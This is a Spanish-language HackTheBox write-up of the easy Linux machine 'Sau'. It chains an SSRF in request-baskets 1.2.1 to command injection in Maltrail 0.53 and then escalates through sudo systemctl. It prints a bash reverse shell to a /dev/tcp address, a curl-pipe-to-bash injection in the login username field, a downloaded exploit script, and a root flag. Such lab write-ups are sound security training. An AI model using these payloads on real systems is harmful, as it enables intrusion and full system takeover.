Propiedades:
- OS: Linux
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #ssrf #CVE-2023-27163 #request-basket #maltrail


![](assets/Pasted%20image%2020251213185022.png)
## Reconocimiento

Comienzo tirando un ping para comprobar conectividad:

```bash
> ping -c 1 10.129.6.20
-----------------------------------------------------
PING 10.129.6.20 (10.129.6.20) 56(84) bytes of data.
64 bytes from 10.129.6.20: icmp_seq=1 ttl=63 time=110 ms

--- 10.129.6.20 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 110.111/110.111/110.111/0.000 ms
```

Realizo un escaneo con nmap para ver que puertos tenemos abiertos.
```bash
> sudo nmap -p- -sS -Pn -n --min-rate 5000 -vvv 10.129.6.20
------------------------------------------------------------
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
80/tcp    filtered http    no-response
8338/tcp  filtered unknown no-response
55555/tcp open     unknown syn-ack ttl 63
```

- Puertos 22 y 55555 abiertos.
- Puertos 80 y 8338 filtrados

Sobre los puertos abiertos realizo un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts predeterminados de reconocimiento.

```bash
PORT      STATE    SERVICE REASON         VERSION
22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdY38bkvujLwIK0QnFT+VOKT9zjKiPbyHpE+cVhus9r/6I/uqPzLylknIEjMYOVbFbVd8rTGzbmXKJBdRK61WioiPlKjbqvhO/YTnlkIRXm4jxQgs+xB0l9WkQ0CdHoo/Xe3v7TBije+lqjQ2tvhUY1LH8qBmPIywCbUvyvAGvK92wQpk6CIuHnz6IIIvuZdSklB02JzQGlJgeV54kWySeUKa9RoyapbIqruBqB13esE2/5VWyav0Oq5POjQWOWeiXA6yhIlJjl7NzTp/SFNGHVhkUMSVdA7rQJf10XCafS84IMv55DPSZxwVzt8TLsh2ULTpX8FELRVESVBMxV5rMWLplIA5ScIEnEMUR9HImFVH1dzK+E8W20zZp+toLBO1Nz4/Q/9yLhJ4Et+jcjTdI1LMVeo3VZw3Tp7KHTPsIRnr8ml+3O86e0PK+qsFASDNgb3yU61FEDfA0GwPDa5QxLdknId0bsJeHdbmVUW3zax8EvR+pIraJfuibIEQxZyM=
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEFMztyG0X2EUodqQ3reKn1PJNniZ4nfvqlM7XLxvF1OIzOphb7VEz4SCG6nXXNACQafGd6dIM/1Z8tp662Stbk=
|   256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICYYQRfQHc6ZlP/emxzvwNILdPPElXTjMCOGH6iejfmi
80/tcp    filtered http    no-response
8338/tcp  filtered unknown no-response
55555/tcp open     unknown syn-ack ttl 63
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 14 Dec 2025 00:54:08 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sun, 14 Dec 2025 00:53:39 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sun, 14 Dec 2025 00:53:40 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94SVN%I=7%D=12/13%Time=693E0A93%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/ht
SF:ml;\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Sun,\x2014\x20Dec
SF:\x202025\x2000:53:39\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=
SF:\"/web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnectio
SF:n:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\
SF:x20200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Sun,\x2014\x20Dec
SF:\x202025\x2000:53:40\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReq
SF:uest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
SF:est")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
SF:r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,
SF:67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")
SF:%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nDate:\x20Sun,\x2014\x20Dec\x202025\x2000:54:08\x20G
SF:MT\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x2
SF:0name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250
SF:}\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 22 SSH: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
- Puerto 80 HTTP filtrado
- Puerto 55555 request-baskets
## Enumeración


**Puerto 5555 HTTP**

- En este puerto corre el servicio `request-baskets` que basicamente se utiliza para recolectar e inspeccionar peticiones HTTP. Podemos ver que la version es `1.2.1`

![](assets/Pasted%20image%2020251213185755.png)

Al crear una basket podemos enviarle request y ver toda la informacion de la request.

```bash
> curl http://10.129.6.20:55555/fui786f
```

![](assets/Pasted%20image%2020251213191910.png)

**Forward URL**

Aqui esta lo importante, `request-basket` nos permite colocar una Forward Url. Básicamente al nosotros realizar una petición a nuestro basket nos debería de redirigir a la url que coloquemos.

![](assets/Pasted%20image%2020251213194245.png)


## Explotación Manual

La version `1.2.1` de `request-baskets` es vulnerable a `SSRF` mas en concreto a `CVE-2023-27163`.

Sabemos que gracias a la función de Forward Url nosotros podemos redirigir peticiones a alguna otra URL. Por lo que podemos aprovecharnos de esta función para colocar una forward url que apunte a algun servicio interno de la maquina como el puerto `80`. Esto funcionara ya que es la propia maquina quien esta realizando la peticion a su servicio interno.

- Colocamos la URL y nuestro basket llamado `test` debería de redirigir al servicio/web que este corriendo en el puerto 80 de la maquina

![](assets/Pasted%20image%2020251213194446.png)

Ahora podemos realizarle una petición a nuestro basket `http://10.129.6.27:55555/test/`

- La petición es redirigida a la web del puerto `80` donde nos topamos con `Maltrail` en su version `v0.53`

![](assets/Pasted%20image%2020251213194645.png)

**Maltrail.**

`Maltrail 0.53` es vulnerable a un command injection. La vulnerabilidad existe en el campo username del panel de login y sucede por que la web utiliza `subprocess.check_ouput` para crear logs del usuario provisto en dicho campo. podemos aprovecharnos de esto para craftear algun payload que ejecute comandos. [Exploit](https://github.com/spookier/Maltrail-v0.53-Exploit)

- Nos crearemos un reverse-shell llamada `index.html`

```bash
> cat index.html
#!/bin/bash

bash -i >& /dev/tcp/10.10.15.110/443 0>&1
```

- Y crearemos un servidor con `python`. Cuando se realice una petición a este servidor el archivo index.html va a ser cargado.

```bash
> sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Antes de ejecutar el payload nos tenemos que poner en escucha

```bash
> sudo nc -nlvp 443
Listening on 0.0.0.0 443
```

Y vamos a abusar del campo `username` para que la maquina realice una petición a nuestro servidor python y interprete la reverse-shell con bash.

```bash
> curl http://10.129.6.27:55555/test/login  --data-urlencode 'username=;`curl 10.10.15.110 | bash`'
```

 
Recibimos la conexión exitosamente.

```bash
Listening on 0.0.0.0 443
Connection received on 10.129.6.27 57670
bash: cannot set terminal process group (881): Inappropriate ioctl for device
bash: no job control in this shell
puma@sau:/opt/maltrail$ id
id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
puma@sau:/opt/maltrail$  
```



## Explotación Automatizada


Alternativamente a la explotación manual, ya existe un exploit para automatizar todo el proceso.

Haciendo una simple búsqueda me encuentro con este exploit: [ssrf-to-shell](https://raw.githubusercontent.com/bl4ckarch/ssrf_to_rce_sau/refs/heads/main/ssrf_to_rce_sau.py). Por lo cual lo procedo a bajar

```bash
> wget https://raw.githubusercontent.com/bl4ckarch/ssrf_to_rce_sau/refs/heads/main/ssrf_to_rce_sau.py
> chmod +x ssrf_to_rce_sau.py
```

Nos ponemos en escucha:

```bash
> sudo nc -nlvp 443
```

Y ejecutamos el exploit:

```bash
> python3 ssrf_to_rce_sau.py 10.10.15.110 443 http://10.129.6.20:55555
```

Nos llega la reverse-shell a la maquina.

```bash
> sudo nc -nlvp 443
[sudo] password for wndr: 
Listening on 0.0.0.0 443
Connection received on 10.129.6.20 57206
$ id
id
wuid=1001(puma) gid=1001(puma) groups=1001(puma)
```

## Escalada de Privilegios


Dentro del sistema enumero binarios con privilegios de SUDO y me encuentro con `systemctl`

```bash
puma@sau:/opt/maltrail$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
puma@sau:/opt/maltrail$ sudo -u root /usr/bin/systemctl   
```

Con ayuda de [GTFObins](https://gtfobins.github.io/gtfobins/systemctl/) abusamos del binario y escalamos a root.

```bash
> puma@sau:/opt/maltrail$ sudo -u root /usr/bin/systemctl status trail.service
lines 1-23!/bin/sh
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

Tenemos la flag de root:
```bash
# cat root.txt
bf05eec28778c625094f9d49ca2882a4
```

![](assets/Pasted%20image%2020251213191229.png)